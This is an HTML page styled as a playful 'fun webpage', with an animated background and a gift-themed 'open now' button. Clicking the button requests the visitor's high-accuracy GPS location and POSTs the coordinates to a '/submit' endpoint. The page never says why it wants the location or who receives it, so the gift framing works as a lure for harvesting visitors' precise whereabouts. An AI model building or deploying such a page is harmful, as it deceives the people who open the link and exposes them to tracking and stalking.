<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XL好玩网页</title>
    <style>
        /* 动态网格背景 */
        :root {
            --bg-color: #1a1a1a;
            --text-color: #e0e0e0;
            --primary: #6c5ce7;
            --secondary: #a8a5e6;
        }

        body {
            margin: 0;
            height: 100vh;
            overflow: hidden;
            background: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* 动态按钮样式 */
        .magic-button {
            position: relative;
            padding: 20px 40px;
            font-size: 1.2em;
            background: #2d2d2d;
            border: none;
            border-radius: 15px;
            color: white;
            cursor: pointer;
            overflow: hidden;
            transition: transform 0.3s;
            z-index: 10;
        }

        /* 消息提示动画 */
        @keyframes floatUp {
            0% { opacity: 0; transform: translateY(100%); }
            20% { opacity: 1; }
            80% { opacity: 1; }
            100% { opacity: 0; transform: translateY(-100%); }
        }
    </style>
</head>
<body>

    <!-- 中央按钮 -->
    <button class="magic-button" id="submitBtn">
        <span>🎁 立即开启 ⭐ </span>
    </button>

    <script>
        const canvas = document.createElement('canvas');
        document.body.prepend(canvas);
        canvas.style.position = 'fixed';
        canvas.style.top = 0;
        canvas.style.left = 0;
        canvas.style.zIndex = -1;

        let ctx = canvas.getContext('2d');
        let gridOffset = { x: 0, y: 0 };
        const squareSize = 40;

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }

    function drawGrid() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.strokeStyle = '#333';
        
        gridOffset.x = (gridOffset.x - 0.5 + squareSize) % squareSize;
        gridOffset.y = (gridOffset.y - 0.5 + squareSize) % squareSize;

        for(let x = -squareSize; x < canvas.width; x += squareSize) {
            for(let y = -squareSize; y < canvas.height; y += squareSize) {
                ctx.strokeRect(x + gridOffset.x, y + gridOffset.y, squareSize, squareSize);
            }
        }
        
        requestAnimationFrame(drawGrid);
    }

        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        drawGrid();

        // === 点击粒子效果 ===
        function createSpark(x, y) {
            const spark = document.createElement('div');
            spark.className = 'click-spark';
            spark.style.left = x + 'px';
            spark.style.top = y + 'px';
            
            for(let i=0; i<8; i++) {
                const particle = document.createElement('div');
                particle.style.cssText = `
                    position: absolute;
                    width: 4px;
                    height: 4px;
                    background: #fff;
                    border-radius: 50%;
                    transform: 
                        translate(${Math.cos(Math.PI*2/8*i)*15}px, 
                        ${Math.sin(Math.PI*2/8*i)*15}px)
                        scale(0);
                    animation: spark 400ms ease-out;
                `;
                
                spark.appendChild(particle);
            }
            
            document.body.appendChild(spark);
            setTimeout(() => spark.remove(), 400);
        }

        // === 定位功能 ===
        async function getLocation() {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 15000
                });
            });
        }

        // === 消息提示 ===
        function showMessage(text) {
            const msg = document.createElement('div');
            msg.textContent = text;
            msg.style.cssText = `
                position: fixed;
                bottom: 20px;
                left: 50%;
                transform: translateX(-50%);
                background: #2d2d2d;
                padding: 12px 24px;
                border-radius: 8px;
                animation: floatUp 2s ease-out;
            `;
            document.body.appendChild(msg);
            setTimeout(() => msg.remove(), 2000);
        }

        // === 事件绑定 ===
        document.getElementById('submitBtn').addEventListener('click', async (e) => {
            // 点击效果
            createSpark(e.clientX, e.clientY);
            
            try {
                showMessage('🛰️ 定位中...');
                const pos = await getLocation();
                
                showMessage('🚀 正在发送数据...');
                await fetch('/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    })
                });
                
                showMessage('✅ 发送成功！');
            } catch(err) {
                showMessage(`❌ 错误: ${err.message}`);
            }
        });

        // === 样式动画 ===
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spark {
                0% { transform: scale(1); opacity: 1; }
                100% { transform: scale(2); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
